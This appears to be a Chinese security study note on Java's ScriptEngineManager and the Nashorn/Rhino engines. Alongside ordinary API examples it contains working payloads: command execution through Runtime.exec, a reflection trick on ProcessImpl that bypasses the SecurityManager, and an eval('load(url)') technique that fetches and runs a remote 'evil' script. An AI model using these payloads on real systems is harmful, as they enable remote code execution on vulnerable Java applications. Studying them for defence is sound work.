# ScriptEngineManager

这是java开放的一个面向脚本语言的接口。下面简单总结一下利用方式

Java 6/7采用的js解析引擎是Rhino

java8开始换成了Nashorn。

## Hello World

```java
public class Test {
    public static void main(String[] args) {
        ScriptEngineManager manager = new ScriptEngineManager();
        ScriptEngine engine = manager.getEngineByName("nashorn");//java8
        try {
            engine.eval("print('Hello,World')");
        } catch (ScriptException e) {
            e.printStackTrace();
        }

    }
}
```

在eval中直接执行js的代码就可以了。

## 使用java对象

![image-20220111113416922](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220111113416922.png)

- 反射绕过sm

  ```java
  import javax.script.ScriptEngine;
  import javax.script.ScriptEngineManager;
  
  public class main {
      public static void main(String[] args) throws Exception {
          String poc1 = "var s = [3];\n" +
                  "s[0] = \"cmd\";\n" +
                  "s[1] = \"/c\";\n" +
                  "s[2] = \"whoami\";" +
                  "var p = java.lang.Runtime.getRuntime().exec(s);\n" +
                  "var sc = new java.util.Scanner(p.getInputStream(),\"GBK\").useDelimiter(\"\\\\A\");\n" +
                  "var result = sc.hasNext() ? sc.next() : \"\";\n" +
                  "print(result);sc.close();";
  
          String bypass_sm_exp = "var str = Java.type('java.lang.String[]').class;" +
                  "var map = Java.type('java.util.Map').class;" +
                  "var string = Java.type('java.lang.String').class;" +
                  "var Redirect = Java.type('java.lang.ProcessBuilder.Redirect[]').class;" +
                  "var boolean = Java.type('boolean').class;" +
                  "var c = java.lang.Class.forName('java.lang.ProcessImpl');" +
                  "var start = c.getDeclaredMethod('start',str,map,string,Redirect,boolean);" +
                  "start.setAccessible(true);" +
                  "var anArray = [\"cmd\", \"/c\", \"ipconfig\"];" +
                  "var cmd = Java.to(anArray, Java.type(\"java.lang.String[]\"));" +
                  "var input = start.invoke(null,cmd,null,null,null,false).getInputStream();" +
                  "var reader = new java.io.BufferedReader(new java.io.InputStreamReader(input));" +
                  "var stringBuilder = new java.lang.StringBuilder();" +
                  "var line = null;" +
                  "while((line = reader.readLine())!=null){" +
                  "stringBuilder.append(line);" +
                  "stringBuilder.append('\\r\\n');"+
                  "}" +
                  "stringBuilder.toString();" +
                  "print(stringBuilder)";
          ScriptEngine engine = new ScriptEngineManager().getEngineByExtension("js");
          engine.eval(bypass_sm_exp);
      }
  }
  ```

  

- 方法的重载

  java中的方法会根据参数的不同而被重载。方法在js中被认为是类的一个属性，所以可以用.和[]调用

  ```
  var System = Java.type('java.lang.System');
  System.out['println'](3.14);          // 3.14
  System.out['println(double)'](3.14);  // 3.14
  System.out['println(int)'](3.14);     // 3
  ```

- 使用java的类型

  ```java
  var ArrayList = Java.type("java.util.ArrayList"); var a = new ArrayList(8);
  ```

  ```java
  //Nashorn
  var ArrayList = Java.type("java.util.ArrayList");
  var intType = Java.type("int");
  var StringArrayType = Java.type("java.lang.String[]");
  var int2DArrayType = Java.type("int[][]");
  var str = java.lang.String;
  //这种写法仅仅支持Nashorn，Rhino并不支持。jdk8+
  var str = Java.type("java.lang.String");//类型
  // Rhino
  var Array = java.lang.reflect.Array
  var intClass = java.lang.Integer.TYPE
  var array = Array.newInstance(intClass, 8)
  ```

  也可以通过这个方法来使用他们的静态方法

  ```java
  var File = Java.type("java.io.File");
  File.createTempFile("nashorn", ".tmp");
  //内部类
  var Float = Java.type("java.awt.geom.Arc2D$Float");
  huozhe
  var Arc2D = Java.type("java.awt.geom.Arc2D")
  var Float = Arc2D.Float
  ```

- 导包

  `nashorn:mozilla_compat.js`主要是靠这个

  ```java
  // Load compatibility script
  load("nashorn:mozilla_compat.js");
  // Import the java.awt package
  importPackage(java.awt);
  // Import the java.awt.Frame class
  importClass(java.awt.Frame);
  // Create a new Frame object
  var frame = new java.awt.Frame("hello");
  // Call the setVisible() method
  frame.setVisible(true);
  // Access a JavaBean property
  print(frame.title);
  ```

  有可能导致变量冲突，可以使用with来避免

  ```java
  / Create a JavaImporter object with specified packages and classes to import
  var Gui = new JavaImporter(java.awt, javax.swing);
  // Pass the JavaImporter object to the "with" statement and access the classes
  // from the imported packages by their simple names within the statement's body
  with (Gui) {
   var awtframe = new Frame("AWT Frame");
   var jframe = new JFrame("Swing JFrame");
  };
  ```

- 数组转换

  ```java
  // Convert the JavaScript array to a Java int[] array
  var javaIntArray = Java.to(anArray, "int[]");
  // Convert the JavaScript array to a Java String[] array
  var javaStringArray = Java.to(anArray, Java.type("java.lang.String[]"));
  // Convert the JavaScript array to a Java Object[] array
  var javaObjectArray = Java.to(anArray);
  ```

  `Java.from` 从java的列表转为js的

- 类的实现

  ```java
  var r = new java.lang.Runnable() {
   run: function() {
   print("running...\n");
   }
  };
  var th = new java.lang.Thread(r);
  th.start();
  th.join();
  ```

  但是在js里面可以直接给`Thread`转递方法

- 静态类

  ```java
  var task = new TimerTask {
   run: function() {
   print("Hello World!")
   }
  };
  ```

  ```java
  var Thread = Java.type("java.lang.Thread");
  var threadExtender = Java.extend(Thread);
  var t = new threadExtender() {
   run: function() { print("Thread running!") }};
  
  ```

- 方法

  使用父类的方

  ```java
   Java.super
  ```

## 远程加载

看了心心的yyds文章，既然`engine.eval`可以动态的执行js的代码，那么可不可以从远程来加载`js`呢？

`load("nashorn:mozilla_compat.js");`导包的时候，我们输入了一个url，我们测试如果把他改成url地址会怎么样呢?

![image-20220111152524500](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220111152524500.png)

我们发现，他是去请求了。

最后的实现就是

```
String url = "http://127.0.0.1:8089/evil" ;
eval("load('"+url+"')");
```

evil

```java
var a=exp();function exp(){var x=new java.lang.ProcessBuilder; x.command("calc"); x.start();};
```

![image-20220111154456819](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220111154456819.png)

![image-20220111155931737](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220111155931737.png)

## 思考

在看心心的安全客时，我发现他对于知识的学习不是一味地照着别人的在做，是有自己思想的，我们不能成为一个单纯模仿别人的人，可以学习，但不可以**抄袭**